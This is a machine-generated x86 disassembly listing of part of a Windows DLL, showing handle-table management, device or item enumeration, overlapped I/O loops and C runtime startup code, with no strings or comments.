100016d2:	68 04 01 00 00       	push   $0x104
100016d7:	8d 47 04             	lea    0x4(%edi),%eax
100016da:	50                   	push   %eax
100016db:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
100016e1:	50                   	push   %eax
100016e2:	e8 a9 2c 00 00       	call   0x10004390
100016e7:	57                   	push   %edi
100016e8:	e8 c7 2d 00 00       	call   0x100044b4
100016ed:	83 c4 10             	add    $0x10,%esp
100016f0:	c7 85 dc fe ff ff 1c 	movl   $0x1c,-0x124(%ebp)
100016f7:	00 00 00 
100016fa:	8d 85 dc fe ff ff    	lea    -0x124(%ebp),%eax
10001700:	43                   	inc    %ebx
10001701:	50                   	push   %eax
10001702:	53                   	push   %ebx
10001703:	68 9c 1c 01 10       	push   $0x10011c9c
10001708:	6a 00                	push   $0x0
1000170a:	56                   	push   %esi
1000170b:	ff 15 1c d1 00 10    	call   *0x1000d11c
10001711:	85 c0                	test   %eax,%eax
10001713:	0f 85 4f ff ff ff    	jne    0x10001668
10001719:	ff 15 40 d0 00 10    	call   *0x1000d040
1000171f:	3d 03 01 00 00       	cmp    $0x103,%eax
10001724:	75 23                	jne    0x10001749
10001726:	56                   	push   %esi
10001727:	ff 15 34 d1 00 10    	call   *0x1000d134
1000172d:	5f                   	pop    %edi
1000172e:	8b c3                	mov    %ebx,%eax
10001730:	5b                   	pop    %ebx
10001731:	5e                   	pop    %esi
10001732:	8b 4d fc             	mov    -0x4(%ebp),%ecx
10001735:	33 cd                	xor    %ebp,%ecx
10001737:	e8 4d 05 00 00       	call   0x10001c89
1000173c:	8b e5                	mov    %ebp,%esp
1000173e:	5d                   	pop    %ebp
1000173f:	c3                   	ret
10001740:	57                   	push   %edi
10001741:	e8 6e 2d 00 00       	call   0x100044b4
10001746:	83 c4 04             	add    $0x4,%esp
10001749:	56                   	push   %esi
1000174a:	ff 15 34 d1 00 10    	call   *0x1000d134
10001750:	8b 4d fc             	mov    -0x4(%ebp),%ecx
10001753:	83 c8 ff             	or     $0xffffffff,%eax
10001756:	5f                   	pop    %edi
10001757:	5b                   	pop    %ebx
10001758:	33 cd                	xor    %ebp,%ecx
1000175a:	5e                   	pop    %esi
1000175b:	e8 29 05 00 00       	call   0x10001c89
10001760:	8b e5                	mov    %ebp,%esp
10001762:	5d                   	pop    %ebp
10001763:	c3                   	ret
10001764:	cc                   	int3
10001765:	cc                   	int3
10001766:	cc                   	int3
10001767:	cc                   	int3
10001768:	cc                   	int3
10001769:	cc                   	int3
1000176a:	cc                   	int3
1000176b:	cc                   	int3
1000176c:	cc                   	int3
1000176d:	cc                   	int3
1000176e:	cc                   	int3
1000176f:	cc                   	int3
10001770:	55                   	push   %ebp
10001771:	8b ec                	mov    %esp,%ebp
10001773:	51                   	push   %ecx
10001774:	53                   	push   %ebx
10001775:	56                   	push   %esi
10001776:	57                   	push   %edi
10001777:	83 c8 ff             	or     $0xffffffff,%eax
1000177a:	c7 05 7c 47 01 10 01 	movl   $0x1,0x1001477c
10001781:	00 00 00 
10001784:	b9 80 00 00 00       	mov    $0x80,%ecx
10001789:	c7 05 88 3c 01 10 ff 	movl   $0xffffffff,0x10013c88
10001790:	ff ff ff 
10001793:	bf 80 3a 01 10       	mov    $0x10013a80,%edi
10001798:	c7 05 84 3c 01 10 ff 	movl   $0xffffffff,0x10013c84
1000179f:	ff ff ff 
100017a2:	f3 ab                	rep stos %eax,%es:(%edi)
100017a4:	0b c0                	or     %eax,%eax
100017a6:	b9 80 00 00 00       	mov    $0x80,%ecx
100017ab:	bf 80 38 01 10       	mov    $0x10013880,%edi
100017b0:	f3 ab                	rep stos %eax,%es:(%edi)
100017b2:	e8 49 fe ff ff       	call   0x10001600
100017b7:	8b 4d 0c             	mov    0xc(%ebp),%ecx
100017ba:	8b d8                	mov    %eax,%ebx
100017bc:	89 5d fc             	mov    %ebx,-0x4(%ebp)
100017bf:	89 19                	mov    %ebx,(%ecx)
100017c1:	8b 4d 08             	mov    0x8(%ebp),%ecx
100017c4:	85 c9                	test   %ecx,%ecx
100017c6:	74 31                	je     0x100017f9
100017c8:	8b 35 50 d0 00 10    	mov    0x1000d050,%esi
100017ce:	6a 00                	push   $0x0
100017d0:	6a 00                	push   $0x0
100017d2:	6a 00                	push   $0x0
100017d4:	6a 00                	push   $0x0
100017d6:	ff d6                	call   *%esi
100017d8:	6a 00                	push   $0x0
100017da:	6a 00                	push   $0x0
100017dc:	6a 00                	push   $0x0
100017de:	6a 00                	push   $0x0
100017e0:	a3 88 3c 01 10       	mov    %eax,0x10013c88
100017e5:	a3 6c 47 01 10       	mov    %eax,0x1001476c
100017ea:	ff d6                	call   *%esi
100017ec:	8b 4d 08             	mov    0x8(%ebp),%ecx
100017ef:	a3 84 3c 01 10       	mov    %eax,0x10013c84
100017f4:	a3 48 47 01 10       	mov    %eax,0x10014748
100017f9:	33 ff                	xor    %edi,%edi
100017fb:	85 db                	test   %ebx,%ebx
100017fd:	74 38                	je     0x10001837
100017ff:	8b 75 14             	mov    0x14(%ebp),%esi
10001802:	b8 80 38 01 10       	mov    $0x10013880,%eax
10001807:	8b 5d 10             	mov    0x10(%ebp),%ebx
1000180a:	2b c6                	sub    %esi,%eax
1000180c:	89 45 0c             	mov    %eax,0xc(%ebp)
1000180f:	2b de                	sub    %esi,%ebx
10001811:	51                   	push   %ecx
10001812:	57                   	push   %edi
10001813:	e8 f8 f7 ff ff       	call   0x10001010
10001818:	8b 4d 0c             	mov    0xc(%ebp),%ecx
1000181b:	83 c4 08             	add    $0x8,%esp
1000181e:	89 04 31             	mov    %eax,(%ecx,%esi,1)
10001821:	83 f8 ff             	cmp    $0xffffffff,%eax
10001824:	74 1d                	je     0x10001843
10001826:	8b 4d 08             	mov    0x8(%ebp),%ecx
10001829:	47                   	inc    %edi
1000182a:	89 06                	mov    %eax,(%esi)
1000182c:	89 04 33             	mov    %eax,(%ebx,%esi,1)
1000182f:	83 c6 04             	add    $0x4,%esi
10001832:	3b 7d fc             	cmp    -0x4(%ebp),%edi
10001835:	72 da                	jb     0x10001811
10001837:	5f                   	pop    %edi
10001838:	5e                   	pop    %esi
10001839:	b8 01 00 00 00       	mov    $0x1,%eax
1000183e:	5b                   	pop    %ebx
1000183f:	8b e5                	mov    %ebp,%esp
10001841:	5d                   	pop    %ebp
10001842:	c3                   	ret
10001843:	5f                   	pop    %edi
10001844:	5e                   	pop    %esi
10001845:	33 c0                	xor    %eax,%eax
10001847:	5b                   	pop    %ebx
10001848:	8b e5                	mov    %ebp,%esp
1000184a:	5d                   	pop    %ebp
1000184b:	c3                   	ret
1000184c:	cc                   	int3
1000184d:	cc                   	int3
1000184e:	cc                   	int3
1000184f:	cc                   	int3
10001850:	55                   	push   %ebp
10001851:	8b ec                	mov    %esp,%ebp
10001853:	83 ec 3c             	sub    $0x3c,%esp
10001856:	a1 04 30 01 10       	mov    0x10013004,%eax
1000185b:	33 c5                	xor    %ebp,%eax
1000185d:	89 45 fc             	mov    %eax,-0x4(%ebp)
10001860:	56                   	push   %esi
10001861:	6a 02                	push   $0x2
10001863:	6a 00                	push   $0x0
10001865:	6a 00                	push   $0x0
10001867:	68 8c 1c 01 10       	push   $0x10011c8c
1000186c:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
1000186f:	c7 45 cc 1c 00 00 00 	movl   $0x1c,-0x34(%ebp)
10001876:	ff 15 24 d1 00 10    	call   *0x1000d124
1000187c:	8b f0                	mov    %eax,%esi
1000187e:	33 c0                	xor    %eax,%eax
10001880:	83 fe ff             	cmp    $0xffffffff,%esi
10001883:	0f 84 9d 00 00 00    	je     0x10001926
10001889:	53                   	push   %ebx
1000188a:	8d 58 01             	lea    0x1(%eax),%ebx
1000188d:	89 45 c8             	mov    %eax,-0x38(%ebp)
10001890:	8d 45 cc             	lea    -0x34(%ebp),%eax
10001893:	50                   	push   %eax
10001894:	6a 00                	push   $0x0
10001896:	56                   	push   %esi
10001897:	ff 15 30 d1 00 10    	call   *0x1000d130
1000189d:	85 c0                	test   %eax,%eax
1000189f:	74 7b                	je     0x1000191c
100018a1:	8b 45 c4             	mov    -0x3c(%ebp),%eax
100018a4:	f7 d8                	neg    %eax
100018a6:	57                   	push   %edi
100018a7:	8b 3d 40 d0 00 10    	mov    0x1000d040,%edi
100018ad:	1b c0                	sbb    %eax,%eax
100018af:	83 c0 02             	add    $0x2,%eax
100018b2:	89 45 c4             	mov    %eax,-0x3c(%ebp)
100018b5:	ff 45 c8             	incl   -0x38(%ebp)
100018b8:	89 45 f0             	mov    %eax,-0x10(%ebp)
100018bb:	8d 45 e8             	lea    -0x18(%ebp),%eax
100018be:	6a 14                	push   $0x14
100018c0:	50                   	push   %eax
100018c1:	8d 45 cc             	lea    -0x34(%ebp),%eax
100018c4:	c7 45 e8 08 00 00 00 	movl   $0x8,-0x18(%ebp)
100018cb:	50                   	push   %eax
100018cc:	56                   	push   %esi
100018cd:	c7 45 ec 12 00 00 00 	movl   $0x12,-0x14(%ebp)
100018d4:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
100018db:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
100018e2:	ff 15 2c d1 00 10    	call   *0x1000d12c
100018e8:	8b d8                	mov    %eax,%ebx
100018ea:	85 db                	test   %ebx,%ebx
100018ec:	74 15                	je     0x10001903
100018ee:	8d 45 cc             	lea    -0x34(%ebp),%eax
100018f1:	50                   	push   %eax
100018f2:	56                   	push   %esi
100018f3:	ff 15 20 d1 00 10    	call   *0x1000d120
100018f9:	85 c0                	test   %eax,%eax
100018fb:	75 06                	jne    0x10001903
100018fd:	ff d7                	call   *%edi
100018ff:	33 db                	xor    %ebx,%ebx
10001901:	eb 02                	jmp    0x10001905
10001903:	ff d7                	call   *%edi
10001905:	8d 45 cc             	lea    -0x34(%ebp),%eax
10001908:	50                   	push   %eax
10001909:	8b 45 c8             	mov    -0x38(%ebp),%eax
1000190c:	50                   	push   %eax
1000190d:	56                   	push   %esi
1000190e:	ff 15 30 d1 00 10    	call   *0x1000d130
10001914:	85 c0                	test   %eax,%eax
10001916:	8b 45 c4             	mov    -0x3c(%ebp),%eax
10001919:	75 9a                	jne    0x100018b5
1000191b:	5f                   	pop    %edi
1000191c:	56                   	push   %esi
1000191d:	ff 15 34 d1 00 10    	call   *0x1000d134
10001923:	8b c3                	mov    %ebx,%eax
10001925:	5b                   	pop    %ebx
10001926:	8b 4d fc             	mov    -0x4(%ebp),%ecx
10001929:	33 cd                	xor    %ebp,%ecx
1000192b:	5e                   	pop    %esi
1000192c:	e8 58 03 00 00       	call   0x10001c89
10001931:	8b e5                	mov    %ebp,%esp
10001933:	5d                   	pop    %ebp
10001934:	c3                   	ret
10001935:	cc                   	int3
10001936:	cc                   	int3
10001937:	cc                   	int3
10001938:	cc                   	int3
10001939:	cc                   	int3
1000193a:	cc                   	int3
1000193b:	cc                   	int3
1000193c:	cc                   	int3
1000193d:	cc                   	int3
1000193e:	cc                   	int3
1000193f:	cc                   	int3
10001940:	33 c9                	xor    %ecx,%ecx
10001942:	e8 09 ff ff ff       	call   0x10001850
10001947:	68 88 13 00 00       	push   $0x1388
1000194c:	ff 15 3c d0 00 10    	call   *0x1000d03c
10001952:	b9 01 00 00 00       	mov    $0x1,%ecx
10001957:	e9 f4 fe ff ff       	jmp    0x10001850
1000195c:	cc                   	int3
1000195d:	cc                   	int3
1000195e:	cc                   	int3
1000195f:	cc                   	int3
10001960:	a1 84 3c 01 10       	mov    0x10013c84,%eax
10001965:	53                   	push   %ebx
10001966:	56                   	push   %esi
10001967:	57                   	push   %edi
10001968:	8b 3d 48 d0 00 10    	mov    0x1000d048,%edi
1000196e:	85 c0                	test   %eax,%eax
10001970:	74 12                	je     0x10001984
10001972:	83 f8 ff             	cmp    $0xffffffff,%eax
10001975:	74 0d                	je     0x10001984
10001977:	50                   	push   %eax
10001978:	ff d7                	call   *%edi
1000197a:	c7 05 84 3c 01 10 ff 	movl   $0xffffffff,0x10013c84
10001981:	ff ff ff 
10001984:	a1 88 3c 01 10       	mov    0x10013c88,%eax
10001989:	85 c0                	test   %eax,%eax
1000198b:	74 12                	je     0x1000199f
1000198d:	83 f8 ff             	cmp    $0xffffffff,%eax
10001990:	74 0d                	je     0x1000199f
10001992:	50                   	push   %eax
10001993:	ff d7                	call   *%edi
10001995:	c7 05 88 3c 01 10 ff 	movl   $0xffffffff,0x10013c88
1000199c:	ff ff ff 
1000199f:	8b 1d 4c d1 00 10    	mov    0x1000d14c,%ebx
100019a5:	33 f6                	xor    %esi,%esi
100019a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
100019ae:	00 00 
100019b0:	8b 86 80 38 01 10    	mov    0x10013880(%esi),%eax
100019b6:	85 c0                	test   %eax,%eax
100019b8:	74 25                	je     0x100019df
100019ba:	83 f8 ff             	cmp    $0xffffffff,%eax
100019bd:	74 20                	je     0x100019df
100019bf:	ff 30                	push   (%eax)
100019c1:	ff d3                	call   *%ebx
100019c3:	ff b6 80 3a 01 10    	push   0x10013a80(%esi)
100019c9:	ff d7                	call   *%edi
100019cb:	c7 86 80 3a 01 10 ff 	movl   $0xffffffff,0x10013a80(%esi)
100019d2:	ff ff ff 
100019d5:	c7 86 80 38 01 10 ff 	movl   $0xffffffff,0x10013880(%esi)
100019dc:	ff ff ff 
100019df:	83 c6 04             	add    $0x4,%esi
100019e2:	81 fe 00 02 00 00    	cmp    $0x200,%esi
100019e8:	7c c6                	jl     0x100019b0
100019ea:	5f                   	pop    %edi
100019eb:	5e                   	pop    %esi
100019ec:	5b                   	pop    %ebx
100019ed:	c3                   	ret
100019ee:	cc                   	int3
100019ef:	cc                   	int3
100019f0:	55                   	push   %ebp
100019f1:	8b ec                	mov    %esp,%ebp
100019f3:	83 ec 18             	sub    $0x18,%esp
100019f6:	a1 04 30 01 10       	mov    0x10013004,%eax
100019fb:	33 c5                	xor    %ebp,%eax
100019fd:	89 45 fc             	mov    %eax,-0x4(%ebp)
10001a00:	8b 45 18             	mov    0x18(%ebp),%eax
10001a03:	8d 55 f0             	lea    -0x10(%ebp),%edx
10001a06:	8b 4d 08             	mov    0x8(%ebp),%ecx
10001a09:	53                   	push   %ebx
10001a0a:	8b 5d 10             	mov    0x10(%ebp),%ebx
10001a0d:	56                   	push   %esi
10001a0e:	89 45 f0             	mov    %eax,-0x10(%ebp)
10001a11:	33 f6                	xor    %esi,%esi
10001a13:	8b 45 0c             	mov    0xc(%ebp),%eax
10001a16:	57                   	push   %edi
10001a17:	8b 7d 14             	mov    0x14(%ebp),%edi
10001a1a:	89 45 f4             	mov    %eax,-0xc(%ebp)
10001a1d:	8d 45 ec             	lea    -0x14(%ebp),%eax
10001a20:	50                   	push   %eax
10001a21:	6a 0c                	push   $0xc
10001a23:	89 4d e8             	mov    %ecx,-0x18(%ebp)
10001a26:	89 75 ec             	mov    %esi,-0x14(%ebp)
10001a29:	89 5d f8             	mov    %ebx,-0x8(%ebp)
10001a2c:	e8 3f f8 ff ff       	call   0x10001270
10001a31:	83 c4 08             	add    $0x8,%esp
10001a34:	85 c0                	test   %eax,%eax
10001a36:	75 18                	jne    0x10001a50
10001a38:	5f                   	pop    %edi
10001a39:	8d 46 02             	lea    0x2(%esi),%eax
10001a3c:	5e                   	pop    %esi
10001a3d:	5b                   	pop    %ebx
10001a3e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
10001a41:	33 cd                	xor    %ebp,%ecx
10001a43:	e8 41 02 00 00       	call   0x10001c89
10001a48:	8b e5                	mov    %ebp,%esp
10001a4a:	5d                   	pop    %ebp
10001a4b:	c3                   	ret
10001a4c:	0f 1f 40 00          	nopl   0x0(%eax)
10001a50:	8b 4d e8             	mov    -0x18(%ebp),%ecx
10001a53:	8d 45 ec             	lea    -0x14(%ebp),%eax
10001a56:	50                   	push   %eax
10001a57:	8b 45 f8             	mov    -0x8(%ebp),%eax
10001a5a:	8b d7                	mov    %edi,%edx
10001a5c:	2b c6                	sub    %esi,%eax
10001a5e:	50                   	push   %eax
10001a5f:	e8 0c f8 ff ff       	call   0x10001270
10001a64:	83 c4 08             	add    $0x8,%esp
10001a67:	85 c0                	test   %eax,%eax
10001a69:	74 1d                	je     0x10001a88
10001a6b:	03 75 ec             	add    -0x14(%ebp),%esi
10001a6e:	03 7d ec             	add    -0x14(%ebp),%edi
10001a71:	3b f3                	cmp    %ebx,%esi
10001a73:	72 db                	jb     0x10001a50
10001a75:	5f                   	pop    %edi
10001a76:	5e                   	pop    %esi
10001a77:	33 c0                	xor    %eax,%eax
10001a79:	5b                   	pop    %ebx
10001a7a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
10001a7d:	33 cd                	xor    %ebp,%ecx
10001a7f:	e8 05 02 00 00       	call   0x10001c89
10001a84:	8b e5                	mov    %ebp,%esp
10001a86:	5d                   	pop    %ebp
10001a87:	c3                   	ret
10001a88:	8b 4d fc             	mov    -0x4(%ebp),%ecx
10001a8b:	b8 05 00 00 00       	mov    $0x5,%eax
10001a90:	5f                   	pop    %edi
10001a91:	5e                   	pop    %esi
10001a92:	33 cd                	xor    %ebp,%ecx
10001a94:	5b                   	pop    %ebx
10001a95:	e8 ef 01 00 00       	call   0x10001c89
10001a9a:	8b e5                	mov    %ebp,%esp
10001a9c:	5d                   	pop    %ebp
10001a9d:	c3                   	ret
10001a9e:	cc                   	int3
10001a9f:	cc                   	int3
10001aa0:	55                   	push   %ebp
10001aa1:	8b ec                	mov    %esp,%ebp
10001aa3:	83 ec 14             	sub    $0x14,%esp
10001aa6:	53                   	push   %ebx
10001aa7:	56                   	push   %esi
10001aa8:	57                   	push   %edi
10001aa9:	6a 0c                	push   $0xc
10001aab:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
10001ab2:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
10001ab9:	e8 e1 01 00 00       	call   0x10001c9f
10001abe:	8b 75 14             	mov    0x14(%ebp),%esi
10001ac1:	8b d8                	mov    %eax,%ebx
10001ac3:	56                   	push   %esi
10001ac4:	89 5d f8             	mov    %ebx,-0x8(%ebp)
10001ac7:	e8 d3 01 00 00       	call   0x10001c9f
10001acc:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
10001acf:	8b f8                	mov    %eax,%edi
10001ad1:	89 0b                	mov    %ecx,(%ebx)
10001ad3:	8d 45 ec             	lea    -0x14(%ebp),%eax
10001ad6:	8b 4d 10             	mov    0x10(%ebp),%ecx
10001ad9:	8b d3                	mov    %ebx,%edx
10001adb:	50                   	push   %eax
10001adc:	89 4b 04             	mov    %ecx,0x4(%ebx)
10001adf:	8b 4d 0c             	mov    0xc(%ebp),%ecx
10001ae2:	6a 0c                	push   $0xc
10001ae4:	89 7d f0             	mov    %edi,-0x10(%ebp)
10001ae7:	89 73 08             	mov    %esi,0x8(%ebx)
10001aea:	e8 81 f7 ff ff       	call   0x10001270
10001aef:	83 c4 10             	add    $0x10,%esp
10001af2:	85 c0                	test   %eax,%eax
10001af4:	75 1b                	jne    0x10001b11
10001af6:	53                   	push   %ebx
10001af7:	e8 9e 01 00 00       	call   0x10001c9a
10001afc:	57                   	push   %edi
10001afd:	e8 98 01 00 00       	call   0x10001c9a
10001b02:	83 c4 08             	add    $0x8,%esp
10001b05:	b8 02 00 00 00       	mov    $0x2,%eax
10001b0a:	5f                   	pop    %edi
10001b0b:	5e                   	pop    %esi
10001b0c:	5b                   	pop    %ebx
10001b0d:	8b e5                	mov    %ebp,%esp
10001b0f:	5d                   	pop    %ebp
10001b10:	c3                   	ret
10001b11:	8b 15 50 d1 00 10    	mov    0x1000d150,%edx
10001b17:	8b 45 fc             	mov    -0x4(%ebp),%eax
10001b1a:	8b 4d 18             	mov    0x18(%ebp),%ecx
10001b1d:	0f 1f 00             	nopl   (%eax)
10001b20:	83 3d 80 3c 01 10 00 	cmpl   $0x0,0x10013c80
10001b27:	bf 01 00 00 00       	mov    $0x1,%edi
10001b2c:	8b 5b 08             	mov    0x8(%ebx),%ebx
10001b2f:	0f 84 c9 00 00 00    	je     0x10001bfe
10001b35:	8b 75 08             	mov    0x8(%ebp),%esi
10001b38:	39 3d 7c 47 01 10    	cmp    %edi,0x1001477c
10001b3e:	75 17                	jne    0x10001b57
10001b40:	68 5c 47 01 10       	push   $0x1001475c
10001b45:	8d 45 fc             	lea    -0x4(%ebp),%eax
10001b48:	89 75 1c             	mov    %esi,0x1c(%ebp)
10001b4b:	50                   	push   %eax
10001b4c:	0f b6 46 05          	movzbl 0x5(%esi),%eax
10001b50:	53                   	push   %ebx
10001b51:	51                   	push   %ecx
10001b52:	50                   	push   %eax
10001b53:	ff 36                	push   (%esi)
10001b55:	ff d2                	call   *%edx
10001b57:	ff 15 40 d0 00 10    	call   *0x1000d040
10001b5d:	3d e5 03 00 00       	cmp    $0x3e5,%eax
10001b62:	74 40                	je     0x10001ba4
10001b64:	ff 15 40 d0 00 10    	call   *0x1000d040
10001b6a:	85 c0                	test   %eax,%eax
10001b6c:	75 32                	jne    0x10001ba0
10001b6e:	8b 45 fc             	mov    -0x4(%ebp),%eax
10001b71:	85 c0                	test   %eax,%eax
10001b73:	0f 84 d1 00 00 00    	je     0x10001c4a
10001b79:	3b c3                	cmp    %ebx,%eax
10001b7b:	0f 84 c9 00 00 00    	je     0x10001c4a
10001b81:	ff 75 f8             	push   -0x8(%ebp)
10001b84:	e8 11 01 00 00       	call   0x10001c9a
10001b89:	ff 75 f0             	push   -0x10(%ebp)
10001b8c:	e8 09 01 00 00       	call   0x10001c9a
10001b91:	83 c4 08             	add    $0x8,%esp
10001b94:	b8 05 00 00 00       	mov    $0x5,%eax
10001b99:	5f                   	pop    %edi
10001b9a:	5e                   	pop    %esi
10001b9b:	5b                   	pop    %ebx
10001b9c:	8b e5                	mov    %ebp,%esp
10001b9e:	5d                   	pop    %ebp
10001b9f:	c3                   	ret
10001ba0:	33 ff                	xor    %edi,%edi
10001ba2:	eb 18                	jmp    0x10001bbc
10001ba4:	68 10 27 00 00       	push   $0x2710
10001ba9:	ff 35 88 3c 01 10    	push   0x10013c88
10001baf:	ff 15 38 d0 00 10    	call   *0x1000d038
10001bb5:	33 c9                	xor    %ecx,%ecx
10001bb7:	85 c0                	test   %eax,%eax
10001bb9:	0f 45 f9             	cmovne %ecx,%edi
10001bbc:	83 3d 7c 47 01 10 01 	cmpl   $0x1,0x1001477c
10001bc3:	8d 45 fc             	lea    -0x4(%ebp),%eax
10001bc6:	6a 00                	push   $0x0
10001bc8:	50                   	push   %eax
10001bc9:	68 5c 47 01 10       	push   $0x1001475c
10001bce:	75 13                	jne    0x10001be3
10001bd0:	8b 45 1c             	mov    0x1c(%ebp),%eax
10001bd3:	ff 30                	push   (%eax)
10001bd5:	ff 15 4c d0 00 10    	call   *0x1000d04c
10001bdb:	85 c0                	test   %eax,%eax
10001bdd:	75 07                	jne    0x10001be6
10001bdf:	33 ff                	xor    %edi,%edi
10001be1:	eb 07                	jmp    0x10001bea
10001be3:	56                   	push   %esi
10001be4:	eb ef                	jmp    0x10001bd5
10001be6:	85 ff                	test   %edi,%edi
10001be8:	75 07                	jne    0x10001bf1
10001bea:	56                   	push   %esi
10001beb:	ff 15 34 d0 00 10    	call   *0x1000d034
10001bf1:	8b 45 fc             	mov    -0x4(%ebp),%eax
10001bf4:	85 c0                	test   %eax,%eax
10001bf6:	74 4a                	je     0x10001c42
10001bf8:	3b c3                	cmp    %ebx,%eax
10001bfa:	75 85                	jne    0x10001b81
10001bfc:	eb 44                	jmp    0x10001c42
10001bfe:	33 f6                	xor    %esi,%esi
10001c00:	39 3d 7c 47 01 10    	cmp    %edi,0x1001477c
10001c06:	75 4b                	jne    0x10001c53
10001c08:	8b 4d 08             	mov    0x8(%ebp),%ecx
10001c0b:	89 4d 1c             	mov    %ecx,0x1c(%ebp)
10001c0e:	66 90                	xchg   %ax,%ax
10001c10:	6a 00                	push   $0x0
10001c12:	8d 45 fc             	lea    -0x4(%ebp),%eax
10001c15:	50                   	push   %eax
10001c16:	8b 45 18             	mov    0x18(%ebp),%eax
10001c19:	53                   	push   %ebx
10001c1a:	03 c6                	add    %esi,%eax
10001c1c:	50                   	push   %eax
10001c1d:	0f b6 41 05          	movzbl 0x5(%ecx),%eax
10001c21:	50                   	push   %eax
10001c22:	ff 31                	push   (%ecx)
10001c24:	ff d2                	call   *%edx
10001c26:	8b f8                	mov    %eax,%edi
10001c28:	85 ff                	test   %edi,%edi
10001c2a:	0f 84 51 ff ff ff    	je     0x10001b81
10001c30:	8b 45 fc             	mov    -0x4(%ebp),%eax
10001c33:	03 f0                	add    %eax,%esi
10001c35:	8b 4d 08             	mov    0x8(%ebp),%ecx
10001c38:	8b 15 50 d1 00 10    	mov    0x1000d150,%edx
10001c3e:	3b f3                	cmp    %ebx,%esi
10001c40:	72 ce                	jb     0x10001c10
10001c42:	85 ff                	test   %edi,%edi
10001c44:	0f 84 37 ff ff ff    	je     0x10001b81
10001c4a:	8b 4d 18             	mov    0x18(%ebp),%ecx
10001c4d:	8b 15 50 d1 00 10    	mov    0x1000d150,%edx
10001c53:	8b 75 f4             	mov    -0xc(%ebp),%esi
10001c56:	03 c8                	add    %eax,%ecx
10001c58:	03 f0                	add    %eax,%esi
10001c5a:	89 4d 18             	mov    %ecx,0x18(%ebp)
10001c5d:	89 75 f4             	mov    %esi,-0xc(%ebp)
10001c60:	3b 75 14             	cmp    0x14(%ebp),%esi
10001c63:	73 08                	jae    0x10001c6d
10001c65:	8b 5d f8             	mov    -0x8(%ebp),%ebx
10001c68:	e9 b3 fe ff ff       	jmp    0x10001b20
10001c6d:	ff 75 f8             	push   -0x8(%ebp)
10001c70:	e8 25 00 00 00       	call   0x10001c9a
10001c75:	ff 75 f0             	push   -0x10(%ebp)
10001c78:	e8 1d 00 00 00       	call   0x10001c9a
10001c7d:	83 c4 08             	add    $0x8,%esp
10001c80:	33 c0                	xor    %eax,%eax
10001c82:	5f                   	pop    %edi
10001c83:	5e                   	pop    %esi
10001c84:	5b                   	pop    %ebx
10001c85:	8b e5                	mov    %ebp,%esp
10001c87:	5d                   	pop    %ebp
10001c88:	c3                   	ret
10001c89:	3b 0d 04 30 01 10    	cmp    0x10013004,%ecx
10001c8f:	f2 75 02             	bnd jne 0x10001c94
10001c92:	f2 c3                	bnd ret
10001c94:	f2 e9 99 03 00 00    	bnd jmp 0x10002033
10001c9a:	e9 8d 04 00 00       	jmp    0x1000212c
10001c9f:	55                   	push   %ebp
10001ca0:	8b ec                	mov    %esp,%ebp
10001ca2:	5d                   	pop    %ebp
10001ca3:	e9 89 04 00 00       	jmp    0x10002131
10001ca8:	55                   	push   %ebp
10001ca9:	8b ec                	mov    %esp,%ebp
10001cab:	8b 45 0c             	mov    0xc(%ebp),%eax
10001cae:	83 e8 00             	sub    $0x0,%eax
10001cb1:	74 33                	je     0x10001ce6
10001cb3:	83 e8 01             	sub    $0x1,%eax
10001cb6:	74 20                	je     0x10001cd8
10001cb8:	83 e8 01             	sub    $0x1,%eax
10001cbb:	74 11                	je     0x10001cce
10001cbd:	83 e8 01             	sub    $0x1,%eax
10001cc0:	74 05                	je     0x10001cc7
10001cc2:	33 c0                	xor    %eax,%eax
10001cc4:	40                   	inc    %eax
10001cc5:	eb 30                	jmp    0x10001cf7
10001cc7:	e8 3c 06 00 00       	call   0x10002308
10001ccc:	eb 05                	jmp    0x10001cd3
10001cce:	e8 16 06 00 00       	call   0x100022e9
10001cd3:	0f b6 c0             	movzbl %al,%eax
10001cd6:	eb 1f                	jmp    0x10001cf7
10001cd8:	ff 75 10             	push   0x10(%ebp)
10001cdb:	ff 75 08             	push   0x8(%ebp)
10001cde:	e8 18 00 00 00       	call   0x10001cfb
10001ce3:	59                   	pop    %ecx
10001ce4:	eb 10                	jmp    0x10001cf6
10001ce6:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
10001cea:	0f 95 c0             	setne  %al
10001ced:	0f b6 c0             	movzbl %al,%eax
10001cf0:	50                   	push   %eax
10001cf1:	e8 0c 01 00 00       	call   0x10001e02
10001cf6:	59                   	pop    %ecx
10001cf7:	5d                   	pop    %ebp
10001cf8:	c2 0c 00             	ret    $0xc
10001cfb:	6a 10                	push   $0x10
10001cfd:	68 40 22 01 10       	push   $0x10012240
10001d02:	e8 99 09 00 00       	call   0x100026a0
10001d07:	6a 00                	push   $0x0
10001d09:	e8 6b 06 00 00       	call   0x10002379
10001d0e:	59                   	pop    %ecx
10001d0f:	84 c0                	test   %al,%al
10001d11:	0f 84 d1 00 00 00    	je     0x10001de8
10001d17:	e8 62 05 00 00       	call   0x1000227e
10001d1c:	88 45 e3             	mov    %al,-0x1d(%ebp)
10001d1f:	b3 01                	mov    $0x1,%bl
10001d21:	88 5d e7             	mov    %bl,-0x19(%ebp)
10001d24:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10001d28:	83 3d 40 40 01 10 00 	cmpl   $0x0,0x10014040
10001d2f:	0f 85 c5 00 00 00    	jne    0x10001dfa
10001d35:	c7 05 40 40 01 10 01 	movl   $0x1,0x10014040
10001d3c:	00 00 00 
10001d3f:	e8 97 05 00 00       	call   0x100022db
10001d44:	84 c0                	test   %al,%al
10001d46:	74 4d                	je     0x10001d95
10001d48:	e8 ed 08 00 00       	call   0x1000263a
10001d4d:	e8 ad 04 00 00       	call   0x100021ff
10001d52:	e8 c6 04 00 00       	call   0x1000221d
10001d57:	68 78 d1 00 10       	push   $0x1000d178
10001d5c:	68 68 d1 00 10       	push   $0x1000d168
10001d61:	e8 b9 27 00 00       	call   0x1000451f
10001d66:	59                   	pop    %ecx
10001d67:	59                   	pop    %ecx
10001d68:	85 c0                	test   %eax,%eax
